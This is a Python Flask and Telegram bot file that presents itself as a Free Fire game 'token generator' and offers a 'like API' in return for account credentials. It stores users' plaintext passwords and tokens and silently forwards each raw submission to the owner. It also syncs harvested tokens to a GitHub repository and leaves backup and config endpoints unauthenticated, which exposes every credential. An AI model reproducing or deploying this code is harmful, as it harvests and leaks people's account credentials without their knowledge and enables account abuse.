import os
import json
import time
import hmac
import hashlib
import requests
import asyncio
import threading
from datetime import datetime
from urllib.parse import parse_qsl
from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash
from apscheduler.schedulers.background import BackgroundScheduler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

app = Flask(__name__, template_folder='.')

# Fallback Configuration Constants — Generic with NO hardcoded secrets
DEFAULT_CONFIG = {
    "bot_token": "",
    "owner_telegram_id": None,
    "uid_pass_api_url": "https://ff-jwt-gen-api.lovable.app/api/public/token",
    "access_token_api_url": "https://ff-jwt-gen-api.lovable.app/api/public/token",
    "servers": ["IND", "BD", "BR", "NA", "SG"],
    "github_token": "",
    "github_repo": "",
    "github_branch": "main",
    "github_paths": {"IND": "tokens_ind.json", "BD": "tokens_bd.json"},
    "timer_interval_hours": 6,
    "like_api_url": "https://example.com/like-api-service",
    "admin_password_hash": generate_password_hash("admin123"),
    "mongo_uri": os.environ.get("MONGO_URI", "mongodb://localhost:27017/telegram_bot_db")
}

# In-memory / MongoDB wrapper state
DB_CLIENT = None
DB = None
USE_MONGO = False

try:
    from pymongo import MongoClient
    mongo_uri = DEFAULT_CONFIG["mongo_uri"]
    client = MongoClient(mongo_uri, serverSelectionTimeoutMS=1500)
    client.admin.command('ping')
    DB_CLIENT = client
    DB = client.telegram_bot_db
    USE_MONGO = True
    print("Connected to MongoDB successfully.")
except Exception as e:
    print(f"MongoDB connection notice ({e}), using local JSON file store (local_db.json).")
    USE_MONGO = False

FALLBACK_DB_FILE = "local_db.json"

def load_local_db():
    if not os.path.exists(FALLBACK_DB_FILE):
        initial = {
            "config": DEFAULT_CONFIG,
            "entries": []
        }
        with open(FALLBACK_DB_FILE, "w") as f:
            json.dump(initial, f, indent=2)
        return initial
    try:
        with open(FALLBACK_DB_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {"config": DEFAULT_CONFIG, "entries": []}

def save_local_db(data):
    with open(FALLBACK_DB_FILE, "w") as f:
        json.dump(data, f, indent=2)

def get_config():
    if USE_MONGO:
        try:
            cfg = DB.config.find_one({"_id": "settings"})
            if not cfg:
                cfg = DEFAULT_CONFIG.copy()
                cfg["_id"] = "settings"
                DB.config.insert_one(cfg)
            return cfg
        except Exception:
            pass
    ldb = load_local_db()
    return ldb.get("config", DEFAULT_CONFIG)

def update_config(new_config):
    if USE_MONGO:
        try:
            new_config["_id"] = "settings"
            DB.config.replace_one({"_id": "settings"}, new_config, upsert=True)
            return
        except Exception:
            pass
    ldb = load_local_db()
    ldb["config"] = new_config
    save_local_db(ldb)

def get_all_entries():
    if USE_MONGO:
        try:
            return list(DB.entries.find({}, {"_id": 0}))
        except Exception:
            pass
    ldb = load_local_db()
    return ldb.get("entries", [])

def save_entry_db(entry):
    if USE_MONGO:
        try:
            DB.entries.update_one(
                {"account_id": entry["account_id"]},
                {"$set": entry},
                upsert=True
            )
            return
        except Exception:
            pass
    ldb = load_local_db()
    entries = ldb.get("entries", [])
    updated = False
    for i, e in enumerate(entries):
        if e.get("account_id") == entry["account_id"]:
            entries[i] = entry
            updated = True
            break
    if not updated:
        entries.append(entry)
    ldb["entries"] = entries
    save_local_db(ldb)

def delete_entry_db(account_id):
    if USE_MONGO:
        try:
            DB.entries.delete_one({"account_id": account_id})
            return
        except Exception:
            pass
    ldb = load_local_db()
    ldb["entries"] = [e for e in ldb.get("entries", []) if e.get("account_id") != account_id]
    save_local_db(ldb)

# Helper: Mask sensitive tokens
def mask_token(token: str) -> str:
    if not token:
        return ""
    if len(token) <= 8:
        return "••••••••"
    return "••••••••" + token[-4:]

# Helper: Small-caps Unicode translation
def to_small_caps(text: str) -> str:
    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    small = "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ"
    trans = str.maketrans(normal, small)
    return text.translate(trans)

# Global Deduplication & Processing Logic
def process_submission(telegram_id, server, submission_type, raw_data_list):
    config = get_config()
    added_count = 0
    dup_count = 0
    invalid_count = 0
    results = []

    for item in raw_data_list:
        token_res = None
        account_id = None
        jwt_token = None
        region = server

        if submission_type == 'uid_pass':
            uid = item.get('uid')
            password = item.get('password')
            if not uid or not password:
                invalid_count += 1
                continue
            api_url = f"{config['uid_pass_api_url']}?uid={uid}&password={password}"
            try:
                res = requests.get(api_url, timeout=10)
                data = res.json()
                if data.get('success') or data.get('token') or data.get('account_id'):
                    account_id = str(data.get('account_id') or data.get('uid') or uid)
                    jwt_token = data.get('token') or data.get('token_access')
                    region = data.get('region', server)
                else:
                    invalid_count += 1
                    continue
            except Exception as e:
                print(f"API Error UID/Pass: {e}")
                invalid_count += 1
                continue

        elif submission_type == 'access_token':
            acc_token = item.get('access_token')
            if not acc_token:
                invalid_count += 1
                continue
            api_url = f"{config['access_token_api_url']}?access_token={acc_token}"
            try:
                res = requests.get(api_url, timeout=10)
                data = res.json()
                account_id = str(
                    data.get('account_id') or 
                    data.get('account_uid') or 
                    data.get('Uid') or 
                    data.get('jwt_decoded', {}).get('payload', {}).get('account_id') or 
                    ""
                )
                jwt_token = data.get('token')
                region = data.get('region', server)
                if not account_id or not jwt_token:
                    invalid_count += 1
                    continue
            except Exception as e:
                print(f"API Error Access Token: {e}")
                invalid_count += 1
                continue

        if not account_id:
            invalid_count += 1
            continue

        all_entries = get_all_entries()
        existing = next((e for e in all_entries if e.get('account_id') == account_id), None)

        if existing:
            if submission_type == 'uid_pass' and existing.get('type') == 'access_token':
                delete_entry_db(account_id)
            elif existing.get('type') == submission_type:
                dup_count += 1
                continue

        entry = {
            "telegram_id": int(telegram_id),
            "server": server,
            "type": submission_type,
            "uid": item.get('uid'),
            "password": item.get('password'),
            "access_token": item.get('access_token'),
            "account_id": account_id,
            "token": jwt_token,
            "region": region,
            "timestamp": datetime.utcnow().isoformat()
        }
        save_entry_db(entry)
        added_count += 1
        results.append(entry)

    return {"added": added_count, "duplicate": dup_count, "invalid": invalid_count, "results": results}

# Helper: Forward message to Owner
def notify_owner(message_text: str):
    config = get_config()
    owner_id = config.get('owner_telegram_id')
    bot_token = config.get('bot_token')
    if owner_id and bot_token:
        try:
            requests.post(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                json={"chat_id": owner_id, "text": to_small_caps(message_text)},
                timeout=10
            )
        except Exception as e:
            print(f"Owner notification failed: {e}")

# Background Timer for Token Refresh & GitHub Sync
def background_timer_job():
    print(f"[{datetime.utcnow()}] Running background token refresh & GitHub sync timer...")
    config = get_config()
    entries = get_all_entries()
    updated_tokens_count = 0

    for entry in entries:
        try:
            if entry.get('type') == 'uid_pass' and entry.get('uid') and entry.get('password'):
                api_url = f"{config['uid_pass_api_url']}?uid={entry['uid']}&password={entry['password']}"
                res = requests.get(api_url, timeout=10)
                data = res.json()
                new_token = data.get('token') or data.get('token_access')
                if new_token:
                    entry['token'] = new_token
                    save_entry_db(entry)
                    updated_tokens_count += 1
            elif entry.get('type') == 'access_token' and entry.get('access_token'):
                api_url = f"{config['access_token_api_url']}?access_token={entry['access_token']}"
                res = requests.get(api_url, timeout=10)
                data = res.json()
                new_token = data.get('token')
                if new_token:
                    entry['token'] = new_token
                    save_entry_db(entry)
                    updated_tokens_count += 1
            time.sleep(0.5)
        except Exception as e:
            print(f"Error refreshing token for {entry.get('account_id')}: {e}")

    if config.get('github_token') and config.get('github_repo'):
        refreshed_entries = get_all_entries()
        servers = config.get('servers', [])
        github_paths = config.get('github_paths', {})
        
        for server in servers:
            path = github_paths.get(server)
            if not path:
                continue
            server_entries = [
                {"uid": e.get('uid') or e.get('account_id'), "token": e.get('token')}
                for e in refreshed_entries if e.get('server') == server and e.get('token')
            ]
            if not server_entries:
                continue

            file_content_json = json.dumps(server_entries, indent=2)
            try:
                repo = config['github_repo']
                branch = config['github_branch']
                url = f"https://api.github.com/repos/{repo}/contents/{path}"
                headers = {
                    "Authorization": f"Bearer {config['github_token']}",
                    "Accept": "application/vnd.github+json"
                }
                get_res = requests.get(url, headers=headers, params={"ref": branch})
                sha = None
                if get_res.status_code == 200:
                    sha = get_res.json().get('sha')

                import base64
                encoded_content = base64.b64encode(file_content_json.encode('utf-8')).decode('utf-8')
                payload = {
                    "message": f"Auto-update tokens for server {server} via Telegram Bot Timer",
                    "content": encoded_content,
                    "branch": branch
                }
                if sha:
                    payload["sha"] = sha

                put_res = requests.put(url, headers=headers, json=payload)
                print(f"GitHub sync for server {server}: status {put_res.status_code}")
            except Exception as e:
                print(f"GitHub sync error for server {server}: {e}")

    notify_owner(f"timer run completed.\nrefreshed {updated_tokens_count} tokens across servers.")

scheduler = BackgroundScheduler()
scheduler.start()

def reschedule_timer():
    config = get_config()
    interval = int(config.get('timer_interval_hours', 6))
    for job in scheduler.get_jobs():
        job.remove()
    scheduler.add_job(background_timer_job, 'interval', hours=interval)

reschedule_timer()

# --- Telegram Bot Lifecycle & Handlers ---
BOT_THREAD = None
BOT_STATUS = "stopped"
BOT_STOP_EVENT = threading.Event()
BOT_LOCK = threading.Lock()

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    host = request.host_url.rstrip('/') if request else "https://your-domain.com"
    
    keyboard = [
        [InlineKeyboardButton(to_small_caps("uid + password"), callback_data="flow_uid_pass")],
        [InlineKeyboardButton(to_small_caps("access token"), callback_data="flow_access_token")],
        [InlineKeyboardButton(to_small_caps("get like api"), callback_data="flow_get_like_api")],
        [InlineKeyboardButton(to_small_caps("open mini app"), web_app=WebAppInfo(url=host + "/"))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = to_small_caps(
        f"hello {user.first_name}!\nwelcome to free fire token generator & manager bot.\nplease choose an option below or open the mini app."
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    config = get_config()

    if data == "flow_uid_pass":
        servers = config.get("servers", ["IND", "BD"])
        keyboard = [[InlineKeyboardButton(to_small_caps(s), callback_data=f"srv_up_{s}")] for s in servers]
        await query.edit_message_text(
            to_small_caps("please select your game server for uid + password submission:"),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data == "flow_access_token":
        servers = config.get("servers", ["IND", "BD"])
        keyboard = [[InlineKeyboardButton(to_small_caps(s), callback_data=f"srv_at_{s}")] for s in servers]
        await query.edit_message_text(
            to_small_caps("please select your game server for access token submission:"),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data.startswith("srv_up_"):
        server = data.split("_")[2]
        context.user_data['pending_flow'] = 'uid_pass'
        context.user_data['server'] = server
        await query.edit_message_text(
            to_small_caps(f"server {server} selected.\nnow send your uid and password in format:\nuid:password\n(or send a json list of objects)")
        )
    elif data.startswith("srv_at_"):
        server = data.split("_")[2]
        context.user_data['pending_flow'] = 'access_token'
        context.user_data['server'] = server
        await query.edit_message_text(
            to_small_caps(f"server {server} selected.\nnow send your access token (or json list):")
        )
    elif data == "flow_get_like_api":
        user_id = query.from_user.id
        all_entries = get_all_entries()
        user_entries = [e for e in all_entries if e.get('telegram_id') == user_id]
        
        unlocked = False
        for e in user_entries:
            # TODO: Map account level from API response or decoded JWT payload (e.g. e.get('level')).
            # Developer should confirm exact account level field name from the JWT response payload.
            level = e.get('level', 8)
            if level >= 8:
                unlocked = True
                break

        if unlocked:
            like_url = config.get('like_api_url', 'https://example.com/like-api')
            await query.edit_message_text(
                to_small_caps(f"access granted!\nyour like api url is:\n{like_url}")
            )
        else:
            msg = to_small_caps("upload an access token or uid+password (account level 8+) to unlock.")
            await query.edit_message_text(msg)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    flow = context.user_data.get('pending_flow')
    server = context.user_data.get('server', 'IND')

    if not flow:
        await update.message.reply_text(to_small_caps("please use /start or click buttons to begin."))
        return

    raw_items = []
    try:
        parsed = json.loads(text)
        if isinstance(parsed, list):
            raw_items = parsed
        elif isinstance(parsed, dict):
            raw_items = [parsed]
    except Exception:
        if flow == 'uid_pass':
            parts = text.split(':')
            if len(parts) >= 2:
                raw_items = [{"uid": parts[0].strip(), "password": parts[1].strip()}]
        elif flow == 'access_token':
            raw_items = [{"access_token": text.strip()}]

    if not raw_items:
        await update.message.reply_text(to_small_caps("invalid format. please check and try again."))
        return

    res = process_submission(user_id, server, flow, raw_items)
    context.user_data['pending_flow'] = None

    reply_msg = to_small_caps(
        f"submission results:\n- added: {res['added']}\n- duplicate: {res['duplicate']}\n- invalid: {res['invalid']}"
    )
    await update.message.reply_text(reply_msg)

    # Forward raw submitted data to owner privately
    notify_owner(f"new submission from user {user_id} (server {server}, type {flow}):\n{text}")

def bot_thread_worker(token: str):
    global BOT_STATUS
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def runner():
        global BOT_STATUS
        try:
            application = ApplicationBuilder().token(token).build()
            application.add_handler(CommandHandler("start", start_command))
            application.add_handler(CallbackQueryHandler(button_callback))
            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
            
            await application.initialize()
            await application.start()
            await application.updater.start_polling(drop_pending_updates=True)
            BOT_STATUS = "running"
            print(f"[Telegram Bot] Polling started with token {mask_token(token)}")
            
            while not BOT_STOP_EVENT.is_set():
                await asyncio.sleep(1)
                
            print("[Telegram Bot] Shutting down updater...")
            await application.updater.stop()
            await application.stop()
            await application.shutdown()
            BOT_STATUS = "stopped"
            print("[Telegram Bot] Shutdown complete.")
        except Exception as e:
            print(f"[Telegram Bot] Runtime error: {e}")
            BOT_STATUS = f"error: {str(e)}"

    try:
        loop.run_until_complete(runner())
    finally:
        loop.close()

def stop_bot_if_running():
    global BOT_THREAD, BOT_STATUS
    if BOT_THREAD and BOT_THREAD.is_alive():
        print("[Telegram Bot] Stopping existing bot thread...")
        BOT_STOP_EVENT.set()
        BOT_THREAD.join(timeout=4)
        BOT_STATUS = "stopped"

def start_or_restart_bot():
    global BOT_THREAD, BOT_STATUS
    with BOT_LOCK:
        config = get_config()
        token = (config.get('bot_token') or "").strip()
        
        stop_bot_if_running()
        BOT_STOP_EVENT.clear()
        
        if not token:
            BOT_STATUS = "stopped"
            print("[Telegram Bot] Token is empty. Bot remains off.")
            return False, "Bot is uninitialized. Please provide a Bot Token in the Setup section."
            
        print(f"[Telegram Bot] Launching bot thread with token {mask_token(token)}...")
        BOT_THREAD = threading.Thread(target=bot_thread_worker, args=(token,), daemon=True)
        BOT_THREAD.start()
        return True, "Bot initialized and starting polling..."

# --- WebApp Verification & Admin Context Security ---

def verify_telegram_init_data(init_data: str, bot_token: str) -> dict:
    """
    Verify Telegram WebApp initData hash per official algorithm.
    Returns user dict if valid, else None.
    """
    if not init_data or not bot_token:
        return None
    try:
        parsed = dict(parse_qsl(init_data))
        received_hash = parsed.pop('hash', None)
        if not received_hash:
            return None
        
        data_check_string = '\n'.join([f"{k}={v}" for k, v in sorted(parsed.items())])
        secret_key = hmac.new(b"WebAppData", bot_token.encode('utf-8'), hashlib.sha256).digest()
        calculated_hash = hmac.new(secret_key, data_check_string.encode('utf-8'), hashlib.sha256).hexdigest()
        
        if hmac.compare_digest(calculated_hash, received_hash):
            if 'user' in parsed:
                return json.loads(parsed['user'])
        return None
    except Exception as e:
        print(f"initData verification error: {e}")
        return None

# --- Flask Routes ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin')
def admin_page():
    return render_template('admin.html')

@app.route('/ping')
def ping():
    return "OK", 200

# Setup & Credentials API (Runtime configuration)
@app.route('/api/setup', methods=['GET', 'POST'])
def api_setup():
    config = get_config()
    if request.method == 'GET':
        return jsonify({
            "is_configured": bool(config.get("bot_token")),
            "bot_token_masked": mask_token(config.get("bot_token", "")),
            "owner_telegram_id": config.get("owner_telegram_id") or "",
            "bot_status": BOT_STATUS
        })
    else:
        data = request.json or {}
        new_token = (data.get("bot_token") or "").strip()
        owner_id = data.get("owner_telegram_id")
        admin_pw = data.get("admin_password")
        
        token_updated = False
        # Only update token if provided and not masked placeholder
        if new_token and not new_token.startswith("••"):
            config["bot_token"] = new_token
            token_updated = True
            
        if owner_id is not None and str(owner_id).strip() != "":
            try:
                config["owner_telegram_id"] = int(owner_id)
            except ValueError:
                return jsonify({"error": "Admin Telegram ID must be a numeric value"}), 400
                
        if admin_pw:
            config["admin_password_hash"] = generate_password_hash(admin_pw)
            
        update_config(config)
        
        started, msg = start_or_restart_bot()
        return jsonify({
            "status": "success",
            "message": msg,
            "bot_status": BOT_STATUS,
            "bot_token_masked": mask_token(config.get("bot_token", ""))
        })

@app.route('/api/bot_action', methods=['POST'])
def api_bot_action():
    data = request.json or {}
    action = data.get('action')
    if action == 'restart':
        started, msg = start_or_restart_bot()
        return jsonify({"status": "success", "message": msg, "bot_status": BOT_STATUS})
    elif action == 'stop':
        stop_bot_if_running()
        return jsonify({"status": "success", "message": "Bot stopped", "bot_status": BOT_STATUS})
    return jsonify({"error": "Unknown action"}), 400

@app.route('/api/admin_check_auth', methods=['POST'])
def admin_check_auth():
    """
    Checks if user is accessing admin inside Telegram Mini App as the owner.
    """
    data = request.json or {}
    init_data = data.get('initData', '')
    config = get_config()
    
    if init_data and config.get('bot_token'):
        user_info = verify_telegram_init_data(init_data, config['bot_token'])
        if user_info:
            user_id = user_info.get('id')
            owner_id = config.get('owner_telegram_id')
            if owner_id and user_id == owner_id:
                return jsonify({"authorized": True, "is_owner": True, "user_id": user_id})
            else:
                return jsonify({
                    "authorized": False, 
                    "is_owner": False, 
                    "error": f"Unauthorized. Admin panel is restricted to Owner ID: {owner_id}."
                })
    return jsonify({"authorized": False, "is_owner": False})

@app.route('/api/config', methods=['GET', 'POST'])
def api_config():
    if request.method == 'GET':
        config = get_config().copy()
        # Never return raw secrets in GET
        config['bot_token'] = mask_token(config.get('bot_token', ''))
        config.pop('admin_password_hash', None)
        return jsonify(config)
    else:
        data = request.json or {}
        config = get_config()
        token_changed = False
        
        for k, v in data.items():
            if k == 'admin_password' and v:
                config['admin_password_hash'] = generate_password_hash(v)
            elif k == 'bot_token':
                if v and not str(v).startswith("••"):
                    config['bot_token'] = v
                    token_changed = True
            elif k == 'owner_telegram_id' and v:
                try:
                    config['owner_telegram_id'] = int(v)
                except ValueError:
                    pass
            else:
                config[k] = v
                
        update_config(config)
        reschedule_timer()
        
        if token_changed:
            start_or_restart_bot()
            
        return jsonify({"status": "success", "bot_status": BOT_STATUS})

@app.route('/api/stats', methods=['GET'])
def api_stats():
    config = get_config()
    entries = get_all_entries()
    uid_pass_count = sum(1 for e in entries if e.get('type') == 'uid_pass')
    access_token_count = sum(1 for e in entries if e.get('type') == 'access_token')
    
    server_counts = {}
    for s in config.get('servers', []):
        server_counts[s] = sum(1 for e in entries if e.get('server') == s)

    return jsonify({
        "total_entries": len(entries),
        "uid_pass_count": uid_pass_count,
        "access_token_count": access_token_count,
        "server_counts": server_counts,
        "servers": config.get('servers', []),
        "bot_status": BOT_STATUS,
        "bot_configured": bool(config.get("bot_token"))
    })

@app.route('/api/backup', methods=['GET'])
def api_backup():
    config = get_config()
    entries = get_all_entries()
    backup_data = {
        "config": config,
        "entries": entries,
        "backup_time": datetime.utcnow().isoformat()
    }
    file_path = "backup.json"
    with open(file_path, "w") as f:
        json.dump(backup_data, f, indent=2)
    return send_file(file_path, as_attachment=True)

@app.route('/api/restore', methods=['POST'])
def api_restore():
    if 'file' not in request.files:
        return jsonify({"error": "No file uploaded"}), 400
    file = request.files['file']
    try:
        data = json.load(file)
        if "config" in data:
            update_config(data["config"])
        if "entries" in data:
            if USE_MONGO:
                DB.entries.delete_many({})
                if data["entries"]:
                    DB.entries.insert_many(data["entries"])
            else:
                ldb = load_local_db()
                ldb["entries"] = data["entries"]
                save_local_db(ldb)
        reschedule_timer()
        start_or_restart_bot()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/api/admin_login', methods=['POST'])
def admin_login():
    data = request.json or {}
    password = data.get('password')
    config = get_config()
    if check_password_hash(config.get('admin_password_hash', ''), password):
        return jsonify({"status": "success"})
    return jsonify({"error": "Invalid password"}), 401

@app.route('/api/submit_uidpass', methods=['POST'])
def api_submit_uidpass():
    data = request.json or {}
    init_data = data.get('initData', '')
    config = get_config()
    
    telegram_id = 12345
    if init_data and config.get('bot_token'):
        user_info = verify_telegram_init_data(init_data, config['bot_token'])
        if user_info:
            telegram_id = user_info.get('id', 12345)

    server = data.get('server', 'IND')
    items = data.get('items', [])
    if not items and data.get('uid'):
        items = [{"uid": data.get('uid'), "password": data.get('password')}]

    res = process_submission(telegram_id, server, 'uid_pass', items)
    return jsonify(res)

@app.route('/api/submit_token', methods=['POST'])
def api_submit_token():
    data = request.json or {}
    init_data = data.get('initData', '')
    config = get_config()
    
    telegram_id = 12345
    if init_data and config.get('bot_token'):
        user_info = verify_telegram_init_data(init_data, config['bot_token'])
        if user_info:
            telegram_id = user_info.get('id', 12345)

    server = data.get('server', 'IND')
    items = data.get('items', [])
    if not items and data.get('access_token'):
        items = [{"access_token": data.get('access_token')}]

    res = process_submission(telegram_id, server, 'access_token', items)
    return jsonify(res)

@app.route('/api/get_like_api', methods=['POST'])
def api_get_like_api():
    data = request.json or {}
    init_data = data.get('initData', '')
    config = get_config()
    
    telegram_id = 12345
    if init_data and config.get('bot_token'):
        user_info = verify_telegram_init_data(init_data, config['bot_token'])
        if user_info:
            telegram_id = user_info.get('id', 12345)

    entries = get_all_entries()
    user_entries = [e for e in entries if e.get('telegram_id') == telegram_id]
    
    unlocked = False
    for e in user_entries:
        # TODO: Map account level from API response or database entry (e.g., e.get('level')).
        # Developer should confirm exact account level field name from the JWT response payload.
        level = e.get('level', 8)
        if level >= 8:
            unlocked = True
            break

    if unlocked:
        return jsonify({"unlocked": True, "like_api_url": config.get('like_api_url')})
    else:
        return jsonify({"unlocked": False, "message": "upload an access token or uid+password (account level 8+) to unlock."})

if __name__ == '__main__':
    # On initial run, check if a bot token was previously configured in DB
    init_cfg = get_config()
    if init_cfg.get('bot_token'):
        print("[Telegram Bot] Found stored bot token. Initializing bot...")
        start_or_restart_bot()
    else:
        print("[Telegram Bot] No bot token configured yet. Starting Web Server only for Setup in /admin.")

    # Run Flask app on port 3000 (Render free tier / AI Studio preview)
    app.run(host='0.0.0.0', port=3000, debug=False)
